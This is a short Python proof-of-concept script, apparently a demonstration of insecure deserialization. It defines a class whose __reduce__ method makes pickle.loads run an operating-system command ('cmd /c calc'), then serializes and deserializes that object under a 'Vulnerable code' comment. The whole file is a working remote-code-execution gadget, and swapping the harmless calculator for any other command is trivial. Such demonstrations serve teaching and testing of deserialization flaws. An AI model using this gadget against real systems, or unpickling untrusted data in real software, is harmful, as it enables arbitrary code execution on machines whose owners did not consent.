import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('cmd /c calc',))

def serialize(obj):
    return pickle.dumps(obj)

def deserialize(serialized_data):
    return pickle.loads(serialized_data)

# Vulnerable code
deserialize(serialize(RCE()))
